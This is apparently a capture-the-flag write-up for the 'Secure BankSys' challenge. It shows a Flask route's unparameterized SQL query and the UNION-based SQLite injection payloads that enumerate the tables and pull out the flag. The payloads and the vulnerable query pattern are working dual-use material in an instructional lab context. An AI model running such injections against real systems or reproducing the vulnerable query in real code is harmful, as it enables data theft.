---
title: "Ramadan's Spark CTF 2025 — Secure BankSys"
description: 'SQL injection on a banking application'
pubDate: 'Mar 29 2025'
tags: ['ctf', 'web', 'sqli']
thumbnail: 'https://miro.medium.com/v2/resize:fit:1100/1*REZIxHj__1pvQN_BJZEpkg.png'
---

# Secure BankSys

<img src="https://miro.medium.com/v2/resize:fit:1100/1*REZIxHj__1pvQN_BJZEpkg.png" alt="Secure BankSys challenge" />

Looking at the web app we find three pages: main page, accounts, and in the accounts tab we perform a simple SQL injection:

<img src="https://miro.medium.com/v2/resize:fit:1100/1*OFzsjRrOobAhA2t0350uEA.png" alt="SQLi test" />

The vulnerability is in the `/search` route in `app.py`:

```python
sql_query = f"SELECT account_number, customer_name, balance, account_type FROM accounts WHERE account_number LIKE '%{query}%' OR customer_name LIKE '%{query}%' OR account_type LIKE '%{query}%'"
```

User input is directly concatenated into the SQL query without parameterization.

We explore the database structure with UNION-based injection:

```sql
' UNION SELECT 1,2,3,4 --
```

This confirms 4 columns. To find table names:

```sql
' UNION SELECT 1, name, 3, 4 FROM sqlite_master WHERE type='table' --
```

Reveals tables: `accounts`, `users`, `internal_data`, `search_logs`.

To find columns:

```sql
' UNION SELECT 1,2,3,sql FROM sqlite_master WHERE tbl_name = 'internal_data' -- -
```

Extract contents:

```sql
' UNION SELECT 1, content, 3, 4 FROM internal_data --
```

**Flag:** `Spark{G00d_J0B_K1nG_Y0u_4R3_C00k1nGG_1ZSQMLK9LQSX21}`
